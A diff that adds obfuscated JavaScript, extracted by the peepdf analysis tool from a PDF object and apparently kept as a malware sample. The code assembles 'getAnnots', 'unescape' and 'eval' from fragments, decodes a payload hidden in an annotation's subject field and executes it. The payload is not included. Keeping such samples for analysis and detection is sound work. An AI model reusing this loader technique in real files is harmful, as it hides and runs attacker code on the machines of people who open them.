@@ -1,0 +1,21 @@
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+if (1) {
+    var z;
+    var y;
+    r = (r = 'lace', 'rep' + r);
+    z = y = app.doc;
+    y = 0;
+    z.syncAnnotScan();
+    y = z;
+    var p = y['g' + 'et' + 'Annots']({
+        nPage: 0
+    });
+    var s = p[0].subject;
+    var l = s[r](/z/g, 'a%b' [r](/[ab]/g, ''));
+    var th = event.target;
+    s = th['unes' + 'cape'](l);
+    var e = app['ev' + 'al'];
+    e(s);
+}
+
